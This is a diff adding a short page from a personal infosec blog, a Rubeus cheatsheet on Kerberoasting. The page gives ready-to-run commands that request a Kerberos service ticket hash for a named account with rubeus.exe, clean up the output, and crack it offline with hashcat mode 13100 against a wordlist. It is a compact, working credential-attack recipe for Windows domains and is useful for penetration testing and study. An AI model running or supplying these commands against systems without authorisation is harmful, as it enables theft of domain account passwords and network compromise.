@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <title>ovelny - chaos/tools-cheatsheets/rubeus</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta
+      name="description"
+      content="ovelny - notes on infosec, penetration testing, programming and others"
+    />
+    <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="stylesheet" type=text/css href="/assets/css/dead-simple.min.css">
+    <link rel="stylesheet" type=text/css href="/assets/css/rouge.min.css">
+    <link
+      href="/atom.xml"
+      rel="alternate"
+      title="ovelny"
+      type="application/atom+xml"
+    />
+    <script src="/assets/js/scramble-text.min.js" defer></script>
+    <script src="/assets/js/zoom-images.min.js" defer></script>
+    <meta name="twitter:card" content="summary"/>
+    <meta name="twitter:site" content="@ovelny"/>
+    <meta name="twitter:title" content="ovelny - chaos/tools-cheatsheets/rubeus"/>
+    <meta name="twitter:image" content="https://ovelny.sh/assets/images/ovelny-logo.png"/>
+    <meta name="twitter:image:alt" content="ovelny logo: 6 white circles grouped together forming a triangle shape, with a black background."/>
+  </head>
+  <body>
+
+    <header>
+      <section>
+        <a href="/">
+          <img
+            class="logo"
+            src="/assets/images/ovelny-pfp.png"
+            alt="ovelny profile picture: a glitched picture of a three-eyed girl, staring intensely at the viewer."
+          />
+        </a>
+        <h2><a class="ovelny" href="/">ovelny</a></h2>
+      </section>
+      <nav>
+        <a href="/">home</a>
+        <a href="/chaos/">chaos</a>
+        <a href="/phasm/">phasm</a>
+        <a href="/support/">support</a>
+        <a href="/atom.xml" target="_blank" rel="noopener noreferrer">rss</a>
+        <a href="/about/">about</a>
+      </nav>
+    </header>
+    <main>
+
+    
+    <h1>Rubeus</h1>
+
+<h2>Kerberoasting with hashcat</h2>
+
+<div class="highlight"><pre class="highlight shell"><code><span class="c"># Kerberoast a specified user:</span>
+C:<span class="se">\U</span>sers<span class="se">\P</span>ublic<span class="se">\r</span>ubeus.exe kerberoast /user:p00_adm
+
+<span class="c"># Copy the hash output to a file, then</span>
+<span class="c"># trim the spaces and newlines:</span>
+<span class="nb">cat</span> &lt;raw <span class="nb">hash </span>file&gt; | <span class="nb">tr</span> <span class="nt">-d</span> <span class="s1">'\n'</span> | <span class="nb">tr</span> <span class="nt">-d</span> <span class="s1">' '</span> <span class="o">&gt;</span> &lt;trimmed <span class="nb">hash </span>file&gt;
+
+<span class="c"># Crack the hash with hashcat:</span>
+hashcat <span class="nt">-m</span> 13100 <span class="nt">-a</span> 0 &lt;trimmed <span class="nb">hash </span>file&gt; &lt;wordlist&gt; <span class="nt">--force</span>
+</code></pre></div>
+
+    
+    </main>
+    <footer id="footer">
+      <div class="footer-section"><a href="/license/">CC BY-NC-SA 4.0</a><p>&nbsp;::&nbsp;2019 - 2025 ovelny</p></div>
+      <div class="footer-section">「七転び八起き」</div>
+    </footer>
+  </body>
+</html>
+
